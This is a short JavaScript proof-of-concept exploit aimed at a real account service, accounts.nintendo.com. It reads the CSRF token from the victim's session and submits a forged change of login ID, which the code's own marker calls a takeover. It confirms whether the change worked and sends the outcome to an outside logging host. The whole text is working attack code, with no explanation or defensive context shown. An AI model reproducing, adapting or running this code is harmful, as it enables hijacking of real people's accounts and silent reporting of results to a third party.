(async () => {
  const log = (...a) => console.log('[PoC]', ...a);

  let csrf = null;

  try {
    const editPage = await fetch('https://accounts.nintendo.com/login_id/edit', {
      method: 'GET',
      credentials: 'include',
      mode: 'cors'
    });
    const html = await editPage.text();
    const m = html.match(/name="csrf_token"\s+value="([^"]+)"/);
    csrf = m && m[1] ? m[1] : null;
  } catch (e) {
    log('Could not load edit page (CORS/SameSite):', e.message);
  }

  if (!csrf) {
    const el = document.querySelector('input[name="csrf_token"]');
    csrf = el ? el.value : null;
  }

  if (!csrf) {
    log('No CSRF token available - aborting');
    return;
  }

  const body = new URLSearchParams({
    login_id: 'poc_takeover_proof',
    csrf_token: csrf,
    post_login_id_edit_redirect_uri: 'https://accounts.nintendo.com/'
  });

  const res = await fetch('https://accounts.nintendo.com/login_id/edit', {
    method: 'POST',
    credentials: 'include',
    mode: 'cors',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body
  }).catch(e => {
    log('POST failed:', e.message);
    return null;
  });

  if (!res) return;

  log('POST status:', res.status, 'final URL:', res.url);

  const after = await fetch('https://accounts.nintendo.com/login_id/edit', {
    method: 'GET',
    credentials: 'include',
    mode: 'cors'
  }).then(r => r.text()).catch(() => '');

  const changed = after.indexOf('poc_takeover_proof') !== -1;
  log('login_id changed:', changed);

  fetch('https://shiraishi.vercel.app/log?ok=' + changed + '&s=' + res.status)
    .catch(() => {});
})();
